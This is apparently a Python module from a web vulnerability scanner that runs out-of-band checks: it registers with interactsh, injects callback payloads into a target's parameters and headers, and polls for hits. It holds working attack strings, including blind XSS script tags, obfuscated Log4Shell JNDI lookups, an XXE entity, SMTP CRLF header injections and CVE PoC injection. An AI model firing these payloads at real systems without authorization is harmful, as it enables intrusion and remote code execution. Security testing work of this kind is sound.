from __future__ import annotations
import asyncio
import base64
import hashlib
import hmac
import inspect
import json as _json
import logging
import threading
import time
import uuid
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from importlib import import_module
from importlib.util import find_spec
from typing import Any, Dict, Iterable, List, Optional, Protocol, Sequence
from urllib.parse import urlencode, parse_qsl, urlsplit, urlunsplit
import requests as _req

# ---------------------------------------------------------------------------
# RSA + AES-GCM yardımcıları (interactsh şifreli polling için)
# ---------------------------------------------------------------------------
try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa, padding as _asym_padding
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.backends import default_backend
    _CRYPTO_OK = True
except ImportError:
    _CRYPTO_OK = False

_logger = logging.getLogger(__name__)


def _generate_rsa_keypair(key_size: int = 2048) -> tuple[bytes, str]:
    """
    RSA anahtar çifti üretir.
    Döner: (private_key_pem_bytes, public_key_der_base64_str)
    """
    if not _CRYPTO_OK:
        raise RuntimeError("cryptography paketi gerekli: pip install cryptography")
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=key_size,
        backend=default_backend(),
    )
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    public_der = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    public_b64 = base64.b64encode(public_der).decode("ascii")
    return private_pem, public_b64


def _rsa_decrypt(private_key_pem: bytes, ciphertext: bytes) -> bytes:
    """RSA-OAEP ile şifrelenmiş veriyi çözer."""
    if not _CRYPTO_OK:
        raise RuntimeError("cryptography paketi gerekli")
    private_key = serialization.load_pem_private_key(
        private_key_pem, password=None, backend=default_backend()
    )
    return private_key.decrypt(
        ciphertext,
        _asym_padding.OAEP(
            mgf=_asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )


def _aes_gcm_decrypt(key: bytes, data: bytes) -> bytes:
    """
    AES-GCM ile şifrelenmiş veriyi çözer.
    interactsh formatı: ilk 12 byte nonce, geri kalan ciphertext+tag
    """
    if not _CRYPTO_OK:
        raise RuntimeError("cryptography paketi gerekli")
    if len(data) < 12:
        raise ValueError("AES-GCM verisi çok kısa")
    nonce, ciphertext = data[:12], data[12:]
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ciphertext, None)

# --- Dynamic Imports for Resilience ---
httpx = import_module('httpx') if find_spec('httpx') is not None else None

def _replace_query_param(url, key, value):
    p = urlsplit(url)
    q = parse_qsl(p.query, keep_blank_values=True)
    rep = False; out = []
    for k, v in q:
        if not rep and k == key:
            out.append((k, value)); rep = True
        else:
            out.append((k, v))
    if not rep: out.append((key, value))
    return urlunsplit((p.scheme, p.netloc, p.path, urlencode(out), p.fragment))

# =========================== Token & Payload Generation ===========================

def gen_token(prefix: str = "t") -> str:
    return f"{prefix}-{uuid.uuid4().hex[:12]}-{int(time.time())}"

def sign(token: str, secret: str = "") -> Optional[str]:
    if not secret: return None
    return hmac.new(secret.encode(), token.encode(), hashlib.sha256).hexdigest()

def make_token(prefix: str = "ws") -> str:
    return gen_token(prefix)

def token_url(http_base: str, token: str) -> str:
    hb = (http_base or "").rstrip("/")
    return f"{hb}/t/{token}" if hb else f"/t/{token}"

def token_dns(dns_domain: str, token: str) -> str:
    domain = (dns_domain or "").strip(".")
    return f"{token}.{domain}" if domain else token

def build_payloads(
    root_domain: str,
    token: str,
    schemes: Sequence[str] = ("http", "https"),
    include_dns: bool = True,
    include_http: bool = True,
    include_bxss: bool = True,
) -> Dict[str, List[str]]:
    root = (root_domain or "").strip(".")
    host = f"{token}.{root}" if root else token
    payloads: Dict[str, List[str]] = defaultdict(list)

    if include_dns:
        payloads["dns"].append(host)
    if include_http:
        for sc in schemes:
            payloads["http"].append(f"{sc}://{host}/hit?t={token}")
    if include_bxss:
        payloads["bxss"].append(f"<img src=//{host}/bxss?i={token}>")
        payloads["bxss"].append(f"<script src=//{host}/bxss.js?i={token}></script>")
        payloads["bxss"].append(f"javascript:fetch('//{host}/j?i={token}')")
    
    payloads["artifacts"] = [
        token_dns(root_domain, token),
        token_url(f"https://{root}" if root else "", token),
    ]
    return dict(payloads)

# ======================= Query Helpers =======================

def replace_query_param(url: str, key: str, value: Optional[str]) -> str:
    if value is None:
        pr = urlsplit(url)
        q = [(k, v) for (k, v) in parse_qsl(pr.query, keep_blank_values=True) if k != key]
        return urlunsplit((pr.scheme, pr.netloc, pr.path, urlencode(q, doseq=True), pr.fragment))
    
    return _replace_query_param(url, key, value)

def inject_query(url: str, key: str, value: Optional[str]) -> str:
    return replace_query_param(url, key, value)

# =========================== Config & Interface ===========================

@dataclass
class OSATConfig:
    enabled: bool = True
    provider: str = "generic"
    root_domain: str = ""
    api_url: str = ""
    api_key: str = ""
    poll_interval: float = 10.0
    timeout: int = 120
    enable_dns: bool = True
    enable_http: bool = True
    enable_bxss: bool = True
    payload_prefix: str = "x"
    dns_domain: str = ""
    token_prefix: str = ""
    interact_base: str = "https://interact.sh"
    interact_register_path: str = "/register"
    interact_poll_path: str = "/poll"
    verify_tls: bool = True
    proxy: Optional[str] = None

    @classmethod
    def from_dict(cls, d: Optional[Dict[str, Any]]) -> "OSATConfig":
        d = d or {}
        cfg = cls(
            enabled=bool(d.get("enabled", True)),
            provider=str(d.get("provider", "generic")),
            root_domain=str(d.get("root_domain", d.get("dns_domain", ""))),
            api_url=str(d.get("api_url", "")),
            api_key=str(d.get("api_key", "")),
            poll_interval=float(d.get("poll_interval", 10.0)),
            timeout=int(d.get("timeout", 120)),
            enable_dns=bool(d.get("enable_dns", True)),
            enable_http=bool(d.get("enable_http", True)),
            enable_bxss=bool(d.get("enable_bxss", True)),
            payload_prefix=str(d.get("payload_prefix", d.get("token_prefix", "x"))),
            dns_domain=str(d.get("dns_domain", d.get("root_domain", ""))),
            token_prefix=str(d.get("token_prefix", d.get("payload_prefix", ""))),
            interact_base=str(d.get("interact_base", "https://interact.sh")),
            interact_register_path=str(d.get("interact_register_path", "/register")),
            interact_poll_path=str(d.get("interact_poll_path", "/poll")),
            verify_tls=bool(d.get("verify_tls", True)),
            proxy=d.get("proxy", None),
        )
        if not cfg.dns_domain and cfg.root_domain: cfg.dns_domain = cfg.root_domain
        if not cfg.token_prefix and cfg.payload_prefix: cfg.token_prefix = cfg.payload_prefix
        if not cfg.payload_prefix and cfg.token_prefix: cfg.payload_prefix = cfg.token_prefix
        return cfg

class IOSATClient(Protocol):
    async def new_token(self) -> str: ...
    def payloads_for(self, token: str) -> Dict[str, List[str]]: ...
    async def poll_async(self, interested_tokens: Iterable[str]) -> List[Dict[str, Any]]: ...
    async def aclose(self) -> None: ...

IOASTClient = IOSATClient

# =========================== Clients ===========================

class _BaseOSAT:
    def __init__(self, cfg: OSATConfig):
        if httpx is None:
            raise RuntimeError("httpx required: pip install httpx[http2]")
        self.cfg = cfg
        ac_params = set(inspect.signature(httpx.AsyncClient).parameters.keys())
        client_kwargs: Dict[str, Any] = {}
        if "verify" in ac_params: client_kwargs["verify"] = cfg.verify_tls
        if "timeout" in ac_params: client_kwargs["timeout"] = httpx.Timeout(cfg.timeout)
        if find_spec("h2") is not None and "http2" in ac_params: client_kwargs["http2"] = True
        if cfg.proxy:
            if "proxy" in ac_params: client_kwargs["proxy"] = cfg.proxy
            elif "proxies" in ac_params: client_kwargs["proxies"] = cfg.proxy
        # httpx.AsyncClient bağlantı havuzu, ilk kullanıldığı event loop'a bağlanır.
        # OAST sync sarmalayıcıları (poll_events_sync vb.) her çağrıda yeni bir loop
        # açıp kapattığı için TEK bir client'ı kapanmış loop'ta yeniden kullanmak
        # "[OAST] interactsh kayıt hatası: Event loop is closed" hatası veriyordu.
        # Çözüm: client'ı çalışan loop'a göre tembel/loop-bilinçli (yeniden) oluştur.
        self._client_kwargs: Dict[str, Any] = client_kwargs
        self._client_obj = None
        self._client_loop = None

    def _make_async_client(self):
        return httpx.AsyncClient(**self._client_kwargs)

    @property
    def _client(self):
        try:
            cur = asyncio.get_running_loop()
        except RuntimeError:
            cur = None
        loop = self._client_loop
        if (self._client_obj is None
                or loop is not cur
                or (loop is not None and loop.is_closed())):
            self._client_obj = self._make_async_client()
            self._client_loop = cur
        return self._client_obj

    @_client.setter
    def _client(self, value):
        # Geriye dönük uyumluluk: doğrudan atama (örn. testler) hâlâ çalışsın.
        self._client_obj = value
        try:
            self._client_loop = asyncio.get_running_loop()
        except RuntimeError:
            self._client_loop = None

    async def aclose(self) -> None:
        obj = self._client_obj
        if obj is not None:
            try:
                await obj.aclose()
            except Exception:
                pass

class GenericOSATClient(_BaseOSAT, IOSATClient):
    async def new_token(self) -> str:
        return gen_token(self.cfg.payload_prefix or "x")
    
    def payloads_for(self, token: str) -> Dict[str, List[str]]:
        return build_payloads(self.cfg.root_domain, token, include_dns=self.cfg.enable_dns, include_http=self.cfg.enable_http, include_bxss=self.cfg.enable_bxss)

    async def poll_async(self, interested_tokens: Iterable[str]) -> List[Dict[str, Any]]:
        found = []
        if not self.cfg.api_url: return found
        tokens = sorted({t for t in (interested_tokens or []) if t})
        if not tokens: return found
        
        headers = {}
        if self.cfg.api_key: headers["Authorization"] = f"Bearer {self.cfg.api_key}"
        
        try:
            r = await self._client.get(self.cfg.api_url, params={"tokens": ",".join(tokens)}, headers=(headers or None))
            if r.status_code == 200:
                data = r.json() or {}
                for ev in (data.get("events") or []):
                    if str(ev.get("token", "")) in tokens: found.append(ev)
        except Exception as exc:
            _logger.debug("[OAST] poll_async error: %s", exc)
        return found

class InteractshClient(_BaseOSAT, IOSATClient):
    """
    Gerçek interactsh protokolü ile çalışan OAST istemcisi.

    interactsh sunucusu (interact.sh / oast.fun) RSA-OAEP + AES-GCM
    tabanlı şifreli polling kullanır:

    1. Kayıt: RSA public key + secret -> sunucu correlation_id + domain döner
    2. Polling: /poll?id=...&secret=... -> {"aes_key": "<b64>", "data": [...]}
       - aes_key, RSA-OAEP ile şifreli AES anahtarıdır
       - data öğeleri AES-GCM ile şifreli JSON eventlerdir (nonce ilk 12 byte)
    """

    def __init__(self, cfg: OSATConfig):
        super().__init__(cfg)
        self._registered = False
        self._correlation_id: Optional[str] = None
        self._secret: Optional[str] = None
        self._private_key_pem: Optional[bytes] = None
        self._public_key_b64: Optional[str] = None
        self._encrypted: bool = True  # Sunucu şifreleme kullanıyor mu

    async def _ensure_registered(self) -> None:
        if self._registered:
            return
        url = self.cfg.interact_base.rstrip("/") + self.cfg.interact_register_path
        secret = uuid.uuid4().hex

        # RSA anahtar çifti oluştur (cryptography mevcut değilse şifresiz fallback)
        if _CRYPTO_OK:
            try:
                self._private_key_pem, self._public_key_b64 = _generate_rsa_keypair()
            except Exception as e:
                _logger.debug(f"[OAST] RSA üretim hatası: {e} — şifresiz mod deneniyor")
                self._encrypted = False
        else:
            self._encrypted = False

        payload: Dict[str, Any] = {"secret-key": secret}
        if self._encrypted and self._public_key_b64:
            payload["public-key"] = self._public_key_b64

        try:
            r = await self._client.post(url, json=payload)
            if r.status_code not in (200, 201):
                # Bazı self-hosted örnekler GET ile kayıt destekler
                r = await self._client.get(url, params={"secret": secret})

            if r.status_code in (200, 201):
                data = r.json() or {}
                self._correlation_id = str(
                    data.get("id") or data.get("correlation_id") or ""
                )
                if not self._correlation_id:
                    _logger.warning(
                        "[OAST] interactsh yanıt geldi fakat correlation_id boş — "
                        "polling token eşleşmesi çalışmayacak"
                    )
                    self._registered = False
                    return
                self._secret = str(data.get("secret-key") or data.get("secret") or secret)
                root = str(data.get("domain") or "").strip(".")
                if root:
                    self.cfg.root_domain = root
                    self.cfg.dns_domain = root
                self._registered = True
                _logger.info(
                    f"[OAST] interactsh kaydı başarılı: "
                    f"id={self._correlation_id[:12]}, "
                    f"domain={self.cfg.root_domain}, encrypted={self._encrypted}"
                )
        except Exception as e:
            _logger.warning(f"[OAST] interactsh kayıt hatası: {e}")
            self._registered = False

    async def new_token(self) -> str:
        await self._ensure_registered()
        return gen_token(self.cfg.payload_prefix or "x")

    def payloads_for(self, token: str) -> Dict[str, List[str]]:
        return build_payloads(
            self.cfg.root_domain, token,
            include_dns=self.cfg.enable_dns,
            include_http=self.cfg.enable_http,
            include_bxss=self.cfg.enable_bxss,
        )

    async def poll_async(self, interested_tokens: Iterable[str]) -> List[Dict[str, Any]]:
        await self._ensure_registered()
        if not self._registered:
            return []

        poll_url = self.cfg.interact_base.rstrip("/") + self.cfg.interact_poll_path
        tokens = set(interested_tokens or [])
        found: List[Dict[str, Any]] = []

        try:
            r = await self._client.get(
                poll_url,
                params={"id": self._correlation_id, "secret": self._secret},
            )
            if r.status_code != 200:
                return found

            data = r.json() or {}

            # --- Şifreli yanıt (gerçek interactsh protokolü) ---
            if self._encrypted and self._private_key_pem and "aes_key" in data:
                evs = self._decrypt_events(data)
            else:
                # Şifresiz fallback (self-hosted veya test ortamı)
                evs = data.get("data") or data.get("events") or data.get("records") or []

            for ev in evs:
                if not isinstance(ev, dict):
                    continue
                tok = str(ev.get("unique-id") or ev.get("unique_id") or ev.get("token") or "")
                if not tok:
                    # Ham istek içinde token ara
                    raw_req = str(ev.get("raw-request") or ev.get("request") or "")
                    for t in tokens:
                        # Use delimited search to avoid short-token substring collisions
                        if t and any(
                            f"{sep}{t}{sep2}" in raw_req
                            for sep in (".", "/", "=", "?", "&", " ", "\n", "\r")
                            for sep2 in (".", " ", "\n", "\r", "&", '"', "'", "")
                        ):
                            tok = t
                            break
                if tok in tokens:
                    found.append({
                        "token": tok,
                        "raw": ev,
                        "ts": ev.get("timestamp") or ev.get("time"),
                        "protocol": ev.get("protocol", ""),
                        "remote_address": ev.get("remote-address", ""),
                    })
        except Exception as e:
            _logger.debug(f"[OAST] Polling hatası: {e}")
        return found

    def _decrypt_events(self, data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        interactsh şifreli yanıtını çözer.
        data = {"aes_key": "<b64_rsa_enc_aes_key>", "data": ["<b64_aes_enc_item>", ...]}
        """
        events: List[Dict[str, Any]] = []
        try:
            aes_key_enc = base64.b64decode(data["aes_key"])
            aes_key = _rsa_decrypt(self._private_key_pem, aes_key_enc)

            for item in (data.get("data") or []):
                try:
                    raw_bytes = _aes_gcm_decrypt(aes_key, base64.b64decode(item))
                    ev = _json.loads(raw_bytes.decode("utf-8", errors="replace"))
                    events.append(ev)
                except Exception as e:
                    _logger.debug(f"[OAST] Event çözme hatası: {e}")
        except Exception as e:
            _logger.warning(f"[OAST] AES anahtarı çözme hatası: {e}")
        return events

def create_osat_client(cfg: OSATConfig) -> IOSATClient:
    p = (cfg.provider or "generic").strip().lower()
    if p == "interactsh": return InteractshClient(cfg)
    if p in ("collaborator", "burp", "enhanced_collaborator", "burp_pro", "oast_pro"):
        # EnhancedCollaboratorClient is defined later in this module; resolve lazily
        _cls = globals().get("EnhancedCollaboratorClient")
        if _cls is not None:
            return _cls(cfg)
    return GenericOSATClient(cfg)

# =========================== Sync Wrapper ===========================

class OASTClient:
    def __init__(self, session=None, cfg_dict: dict | None = None):
        self.cfg = OSATConfig.from_dict(cfg_dict or {})
        self._client: IOSATClient = create_osat_client(self.cfg)

    def register(self): return {"ok": True}

    def get_host(self) -> str:
        """Return the OOB domain root for payload injection.
        Falls back to a recognisable placeholder when no domain is configured.
        """
        root = self.cfg.root_domain or self.cfg.dns_domain or ""
        return root.strip(".") if root else "oast.example.com"

    def build_url(self, handle=None, tag: str = "") -> str:
        return token_url(f"https://{self.cfg.root_domain}", gen_token(self.cfg.payload_prefix))

    def poll(self, handle) -> dict:
        tokens = handle.get("tokens", []) if isinstance(handle, dict) else list(handle or [])
        return {"events": poll_events_sync(self._client, tokens)}

    @property
    def iosat(self) -> IOSATClient: return self._client

def poll_events_sync(client: IOSATClient, tokens: Sequence[str], timeout: Optional[int] = None) -> List[Dict[str, Any]]:
    def _run():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        coro = client.poll_async(tokens)
        if timeout is not None:
            coro = asyncio.wait_for(coro, timeout)
        try:
            return loop.run_until_complete(coro)
        except Exception:
            return []
        finally:
            loop.close()
            
    with ThreadPoolExecutor(max_workers=1) as ex:
        return ex.submit(_run).result()

def run_oast_on_target(
    session,
    *,
    target: dict,
    oast_client: OASTClient,
    discovered: dict | None = None,
    report_cb=None,
    limits: dict | None = None,
    auth_ctx=None
):
    url = (target or {}).get("url") or ""
    cfg = getattr(oast_client, "cfg", OSATConfig())
    client = getattr(oast_client, "iosat", None) or create_osat_client(cfg)
    max_per_loc = int((limits or {}).get("max_injections_per_loc", 3))

    params = []
    if isinstance(discovered, dict):
        params.extend([str(x) for x in (discovered.get("query") or [])])
    if not params:
        params = ["q", "id", "redirect", "return", "next"]
    params = list(dict.fromkeys(params))[:10]

    headers = {} # _headers_from_auth_ctx(auth_ctx)
    cookies = {} # _cookies_from_auth_ctx(auth_ctx)

    tokens = []
    attempted = []
    
    # Use passed-in session for target-facing requests (SmartSession circuit-breaker/rate-limit)
    _effective_session = session if session is not None else _req.Session()

    async def _async_inject():
        for k in params:
            tok = await client.new_token()
            tokens.append(tok)
            plds = client.payloads_for(tok)
            vals = (plds.get("http", []) + plds.get("dns", []))[:max_per_loc]

            for val in vals:
                inj_url = inject_query(url, k, val)
                try:
                    _effective_session.get(
                        inj_url,
                        headers=(headers or None),
                        cookies=(cookies or None),
                        timeout=6,
                        verify=True,
                    )
                    attempted.append({"url": url, "param": k, "injected": val, "oast_token": tok})
                except Exception as exc:
                    _logger.debug("[oast] Suppressed exception: %r", exc)

        # --- CVE PoC OOB payloads (Log4Shell / Shellshock / ...) ----------------
        # Wire the previously-orphaned CVEPayloadMap into the OOB correlation: give
        # each OOB-capable CVE its OWN token, substitute the token's callback host
        # into the PoC, and fire it via the CVE's natural injection points (headers
        # like User-Agent/X-Forwarded-For for Log4Shell/Shellshock + a query param).
        # Only payloads that actually carry our callback after substitution are kept
        # (path-traversal / reverse-shell PoCs that can't produce an OOB hit are
        # skipped), so a callback on a CVE token is a near-zero-FP, OOB-CONFIRMED
        # critical finding. The existing poll+correlate block below handles the hit.
        try:
            from websecure.core.payload_engine import CVEPayloadMap as _CVEMap
            _cmap = _CVEMap()
            _root = (getattr(cfg, "root_domain", "") or "").strip(".")
            for _cve_id in _cmap.list_cves():
                _info = _cmap.get_info(_cve_id) or {}
                _cve_tok = await client.new_token()
                _cb_host = (f"{_cve_tok}.{_root}" if _root else _cve_tok)
                _plds = [p for p in _cmap.get_payloads(_cve_id, callback_url=_cb_host)
                         if _cb_host in p]   # keep only OOB-detectable (callback present)
                if not _plds:
                    continue
                tokens.append(_cve_tok)
                _name = _info.get("name", _cve_id)
                _sev = _info.get("severity", "Critical")
                _hdrs = _info.get("headers") or []
                _label = f"{_cve_id} {_name} (OOB confirmed)"
                for _pl in _plds[:3]:
                    for _h in _hdrs[:4]:
                        try:
                            _effective_session.get(url, headers={_h: _pl}, timeout=6, verify=True)
                            attempted.append({"url": url, "param": f"header:{_h}", "injected": _pl,
                                              "oast_token": _cve_tok, "label": _label,
                                              "severity": _sev, "cve": _cve_id})
                        except Exception as _e:
                            _logger.debug("[oast] CVE header inject: %r", _e)
                    try:
                        _k = params[0] if params else "q"
                        _effective_session.get(inject_query(url, _k, _pl), timeout=6, verify=True)
                        attempted.append({"url": url, "param": _k, "injected": _pl,
                                          "oast_token": _cve_tok, "label": _label,
                                          "severity": _sev, "cve": _cve_id})
                    except Exception as _e:
                        _logger.debug("[oast] CVE param inject: %r", _e)
        except Exception as _e:
            _logger.debug("[oast] CVE OOB injection skipped: %r", _e)
    
    # Run async injection sync
    with ThreadPoolExecutor(max_workers=1) as ex:
        def _runner():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(_async_inject())
            loop.close()
        ex.submit(_runner).result()

    # Wait for DNS propagation before polling (interactsh callbacks typically arrive in 3-15s)
    _dns_wait = getattr(cfg, "dns_propagation_wait", 10)
    time.sleep(_dns_wait)

    # Poll
    found = poll_events_sync(client, tokens, timeout=getattr(cfg, "poll_interval", 20) + 10)
    
    # Correlate
    results = []
    found_tokens = {str(ev.get("token")): ev for ev in found}
    _seen_cve_tokens: set = set()   # report each CVE (one token) once, not per inject point
    for att in attempted:
        tok = att["oast_token"]
        ev = found_tokens.get(tok)
        if ev:
            # A CVE token bundles several inject points (headers + param) under one
            # token; a single callback confirms the CVE — emit it once.
            _cve = att.get("cve")
            if _cve:
                if tok in _seen_cve_tokens:
                    continue
                _seen_cve_tokens.add(tok)
            # Determine confidence based on how the token was matched
            ev_token = str(
                ev.get("token") or ev.get("unique-id") or ev.get("unique_id") or ""
            )
            if ev_token and ev_token == tok:
                confidence: float = 1.0
            else:
                raw = str(ev.get("raw-request") or ev.get("request") or "")
                confidence = 0.7 if (raw and tok in raw.split()) else 0.3
            confidence_label = (
                "Confirmed" if confidence >= 0.9
                else "Probable" if confidence >= 0.6
                else "Possible"
            )
            _res = {
                "type": att.get("label") or "OAST",
                "severity": att.get("severity") or "High",
                "url": att["url"],
                "param": att["param"],
                "injected": att["injected"],
                "details": ev,
                "confidence": confidence,
                "confidence_label": confidence_label,
            }
            if _cve:
                _res["cve"] = _cve
            results.append(_res)

    if report_cb:
        for r in results: report_cb(r)

    return results

# Helper exports for injection
def _inject_query_param(url, k, v):
    return replace_query_param(url, k, v)


# ============================================================================
# PERSISTENT OAST POLLING THREAD
# ============================================================================

class OASTPollerThread:
    """
    Background thread that polls OAST server during active scans.
    When a callback arrives, it marks the corresponding finding as verified.
    """

    def __init__(self, client, poll_interval: float = 5.0):
        self._client = client
        self._poll_interval = poll_interval
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._token_map: Dict[str, dict] = {}  # token -> finding dict ref
        self._lock = threading.Lock()
        self._callbacks_received: List[dict] = []

    def register_token(self, token: str, finding_ref: dict) -> None:
        """Register an injection token to a finding dict for later correlation."""
        with self._lock:
            self._token_map[token] = finding_ref

    def start(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._poll_loop, daemon=True, name="OASTPoller")
        self._thread.start()
        _logger.info("[OAST] Polling thread started")

    def stop(self, timeout: float = 10.0) -> None:
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=timeout)
        _logger.info(f"[OAST] Polling thread stopped. Total callbacks: {len(self._callbacks_received)}")

    def get_verified_count(self) -> int:
        return len(self._callbacks_received)

    def _poll_loop(self) -> None:
        while not self._stop_event.is_set():
            try:
                self._do_poll()
            except Exception as e:
                _logger.debug(f"[OAST] Poll error: {e}")
            self._stop_event.wait(self._poll_interval)

    def _do_poll(self) -> None:
        try:
            tokens = list(self._token_map.keys())
            if not tokens:
                return
            events = poll_events_sync(self._client, tokens, timeout=int(self._poll_interval + 10))
            if events:
                self._process_events(events)
        except Exception as e:
            _logger.debug(f"[OAST] Client poll failed: {e}")

    @staticmethod
    def _confidence_label(score: float) -> str:
        """Human-readable label for a numeric confidence score."""
        if score >= 0.9:
            return "Confirmed"
        if score >= 0.6:
            return "Probable"
        return "Possible"

    def _process_events(self, events) -> None:
        with self._lock:
            for event in (events if isinstance(events, list) else [events]):
                self._callbacks_received.append(event)
                for token, finding in self._token_map.items():
                    matched = False
                    confidence: float = 0.3  # default: timed injection, no confirmed event
                    if isinstance(event, dict):
                        # Exact match on known token fields first (no false positives)
                        ev_token = str(
                            event.get("token")
                            or event.get("unique-id")
                            or event.get("unique_id")
                            or ""
                        )
                        if ev_token and ev_token == token:
                            matched = True
                            confidence = 1.0  # exact field match — fully confirmed
                        if not matched:
                            # Fallback: look inside raw request body using word-boundary check
                            raw = str(event.get("raw-request") or event.get("request") or "")
                            if raw and token in raw.split():
                                matched = True
                                confidence = 0.7  # word-boundary match in raw body — probable
                    else:
                        # Non-dict event: require token as a standalone word to reduce collision risk
                        ev_str = str(event)
                        if token in ev_str.split():
                            matched = True
                            confidence = 0.7  # word-boundary match in stringified event

                    if matched:
                        finding["verified"] = True
                        finding["oast_callback"] = str(event)[:200]
                        finding["confidence"] = confidence
                        finding["confidence_label"] = self._confidence_label(confidence)
                        finding["verification_method"] = "oast_dns_http_callback"
                        _logger.info(
                            f"[OAST] Verified finding via callback: token={token[:12]} "
                            f"confidence={confidence} ({self._confidence_label(confidence)})"
                        )
                        break  # one event verifies exactly one token — stop searching


# Global singleton - started/stopped by flow_runner
# Lock ensures thread-safe start/stop when multiple threads reach this simultaneously.
_GLOBAL_OAST_POLLER: Optional[OASTPollerThread] = None
_OAST_POLLER_LOCK = threading.Lock()


def start_global_oast_poller(cfg: dict = None) -> Optional[OASTPollerThread]:
    """Start the global OAST polling thread. Call at scan start."""
    global _GLOBAL_OAST_POLLER
    cfg = cfg or {}
    oast_cfg = cfg.get("oast", {})
    poll_interval = float(oast_cfg.get("poll_interval", 5.0))
    with _OAST_POLLER_LOCK:
        if _GLOBAL_OAST_POLLER is not None:
            return _GLOBAL_OAST_POLLER
        try:
            osat_cfg = OSATConfig.from_dict({
                "provider": oast_cfg.get("provider", "interactsh"),
                "interact_base": oast_cfg.get("interact_base", "https://interact.sh"),
                "interact_register_path": oast_cfg.get("interact_register_path", "/register"),
                "interact_poll_path": oast_cfg.get("interact_poll_path", "/poll"),
                "root_domain": oast_cfg.get("root_domain", ""),
                "dns_domain": oast_cfg.get("dns_domain", ""),
                "api_key": oast_cfg.get("api_key", ""),
                "enable_dns": oast_cfg.get("enable_dns", True),
                "enable_http": oast_cfg.get("enable_http", True),
                "enable_bxss": oast_cfg.get("enable_bxss", False),
                "payload_prefix": oast_cfg.get("payload_prefix", "ws"),
            })
            client = InteractshClient(osat_cfg)
            _GLOBAL_OAST_POLLER = OASTPollerThread(client, poll_interval=poll_interval)
            _GLOBAL_OAST_POLLER.start()
            _logger.info("[OAST] Global poller başlatıldı.")
            return _GLOBAL_OAST_POLLER
        except Exception as e:
            _logger.warning(f"[OAST] Could not start poller: {e}")
            return None


def stop_global_oast_poller() -> None:
    """Stop the global OAST polling thread. Call at scan end."""
    global _GLOBAL_OAST_POLLER
    with _OAST_POLLER_LOCK:
        if _GLOBAL_OAST_POLLER:
            _GLOBAL_OAST_POLLER.stop()
            _GLOBAL_OAST_POLLER = None


def get_oast_poller() -> Optional[OASTPollerThread]:
    """Get the current global OAST poller."""
    return _GLOBAL_OAST_POLLER

# ===========================================================================
# ADIM 10 — OAST / Out-of-Band: Multi-Protocol Channels & Advanced Features
# ===========================================================================
import socket as _socket


# ---------------------------------------------------------------------------
# 1. Multi-Protocol OOB Channel Payload Generators
# ---------------------------------------------------------------------------

class OASTSMTPChannel:
    """
    SMTP header-injection OOB payloads.
    Injects OOB domain into To/Cc/From/Reply-To/Return-Path fields.
    Detects SMTP callbacks via interactsh SMTP protocol listener.
    """

    _HEADERS = ["To", "Cc", "Bcc", "From", "Reply-To", "Return-Path", "X-Forwarded-To"]

    def __init__(self, oob_domain: str):
        self.oob_domain = oob_domain.strip(".")

    def payloads(self, token: str) -> Dict[str, str]:
        """Returns {header_name: injected_value} for each SMTP header."""
        addr = f"{token}@{self.oob_domain}"
        return {h: addr for h in self._HEADERS}

    def smtp_injection_payloads(self, token: str) -> List[str]:
        """CRLF + To: style injection strings for form fields."""
        addr = f"{token}@{self.oob_domain}"
        return [
            f"\r\nTo: {addr}",
            f"\nCc: {addr}",
            f"%0d%0aTo: {addr}",
            f"%0aCc: {addr}",
            f"victim@example.com%0aBcc: {addr}",
            f"victim@example.com\r\nReply-To: {addr}",
        ]


class OASTFTPChannel:
    """
    FTP OOB payload generator.
    Used in XXE / SSRF / blind injection contexts.
    """

    def __init__(self, oob_domain: str):
        self.oob_domain = oob_domain.strip(".")

    def payloads(self, token: str) -> List[str]:
        host = f"{token}.{self.oob_domain}"
        return [
            f"ftp://{host}/",
            f"ftp://{host}/{token}",
            f"ftp://anonymous:anonymous@{host}/",
        ]

    def xxe_entity(self, token: str) -> str:
        host = f"{token}.{self.oob_domain}"
        return (
            '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM '
            f'"ftp://{host}/"> ]><foo>&xxe;</foo>'
        )


class OASTLDAPChannel:
    """
    LDAP OOB payload generator.
    Used for Log4Shell-style injection (${jndi:ldap://...}).
    """

    _LOG4SHELL_PREFIXES = [
        "${jndi:ldap://",
        "${${lower:j}ndi:ldap://",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://",
        "${j${lower:n}di:ldap://",
        "%24%7Bjndi%3Aldap%3A%2F%2F",
        "#{jndi:ldap://",
    ]

    def __init__(self, oob_domain: str):
        self.oob_domain = oob_domain.strip(".")

    def payloads(self, token: str) -> List[str]:
        host = f"{token}.{self.oob_domain}"
        return [f"ldap://{host}/a", f"ldaps://{host}/a", f"rmi://{host}/a"]

    def log4shell_payloads(self, token: str) -> List[str]:
        host = f"{token}.{self.oob_domain}"
        return [f"{p}{host}/a}}" for p in self._LOG4SHELL_PREFIXES]


class OASTMultiProtocolProber:
    """
    Aggregates DNS/HTTP/SMTP/FTP/LDAP OOB payload channels into a single
    interface and injects them across multiple injection surfaces.

    SOLID: Single Responsibility — only payload generation + injection,
    not correlation (delegated to OASTCorrelationEngine).
    """

    def __init__(
        self,
        oab_client,  # OASTClient or IOSATClient
        oob_domain: str = "",
        session=None,
    ):
        domain = oob_domain or getattr(getattr(oab_client, "cfg", None), "root_domain", "") or ""
        self.oob_domain = domain.strip(".")
        self._oast = oab_client
        self._session = session
        self._smtp = OASTSMTPChannel(self.oob_domain)
